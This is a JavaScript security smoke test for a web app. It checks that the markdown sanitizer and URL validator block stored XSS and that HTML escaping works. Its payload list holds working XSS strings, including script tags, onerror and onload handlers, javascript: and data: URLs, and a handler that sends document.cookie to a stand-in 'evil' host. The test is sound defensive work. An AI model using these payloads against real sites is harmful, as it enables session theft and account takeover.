/**
 * Guards the two fixes that matter most and are easiest to silently undo:
 *  1. the markdown sanitizer (unsanitized rehypeRaw was stored XSS on every post page)
 *  2. safeExternalUrl (unvalidated hrefs were stored XSS on every profile)
 *
 * Run: node test/security-smoke.mjs
 */
import assert from "node:assert/strict";
import { unified } from "unified";
import remarkParse from "remark-parse";
import remarkGfm from "remark-gfm";
import remarkRehype from "remark-rehype";
import rehypeRaw from "rehype-raw";
import rehypeSanitize, { defaultSchema } from "rehype-sanitize";
import rehypeStringify from "rehype-stringify";
import rehypeParse from "rehype-parse";
import { visit } from "unist-util-visit";
import { safeExternalUrl, escapeHtml } from "../lib/utils.js";

// Keep in sync with components/Markdown.jsx
const schema = {
  ...defaultSchema,
  attributes: {
    ...defaultSchema.attributes,
    img: [...(defaultSchema.attributes?.img || []), "width", "height", "loading"],
    code: [...(defaultSchema.attributes?.code || []), ["className", /^language-./]],
    span: [...(defaultSchema.attributes?.span || []), ["className", /^hljs-./]],
  },
};

const render = unified()
  .use(remarkParse)
  .use(remarkGfm)
  .use(remarkRehype, { allowDangerousHtml: true })
  .use(rehypeRaw)
  .use(rehypeSanitize, schema)
  .use(rehypeStringify, { allowDangerousHtml: true });

function isDangerous(html) {
  const tree = unified().use(rehypeParse, { fragment: true }).parse(html);
  let bad = false;
  visit(tree, "element", (node) => {
    if (["script", "iframe", "object", "embed"].includes(node.tagName)) bad = true;
    for (const [attr, value] of Object.entries(node.properties || {})) {
      if (/^on/i.test(attr)) bad = true;
      if (/^(href|src)$/i.test(attr) && /^\s*javascript:/i.test(String(value))) bad = true;
    }
  });
  return bad;
}

const PAYLOADS = [
  '<img src=x onerror="alert(1)">',
  "<script>alert('pwned')</script>",
  '<a href="javascript:alert(1)">click me</a>',
  '<iframe src="https://evil.example"></iframe>',
  "<svg/onload=alert(1)>",
  `<div onmouseover="fetch('//evil/'+document.cookie)">hover</div>`,
];

for (const payload of PAYLOADS) {
  const html = String(await render.process(payload));
  assert.equal(isDangerous(html), false, `payload survived sanitizing: ${payload}`);
}

// Legitimate content must still render.
const good = String(
  await render.process("# H\n\n**bold** `code`\n\n![p](https://res.cloudinary.com/x/image/upload/a.png)")
);
assert.ok(good.includes("<img"), "sanitizer stripped legitimate images");
assert.ok(good.includes("<code"), "sanitizer stripped legitimate code");
assert.ok(good.includes("<h1"), "sanitizer stripped legitimate headings");

// href validation
for (const bad of ["javascript:alert(1)", "data:text/html,<script>alert(1)</script>", "  JavaScript:alert(1)", "", null, undefined, 42]) {
  assert.equal(safeExternalUrl(bad), null, `safeExternalUrl accepted ${String(bad)}`);
}
assert.equal(safeExternalUrl("https://x.com/a"), "https://x.com/a");
assert.equal(safeExternalUrl("http://x.com/a"), "http://x.com/a");
assert.equal(safeExternalUrl("x.com/a"), "https://x.com/a", "bare host should be upgraded to https");

// e-mail body escaping
assert.equal(escapeHtml('<b>&"x"</b>'), "&lt;b&gt;&amp;&quot;x&quot;&lt;/b&gt;");

console.log("security-smoke: all checks passed");
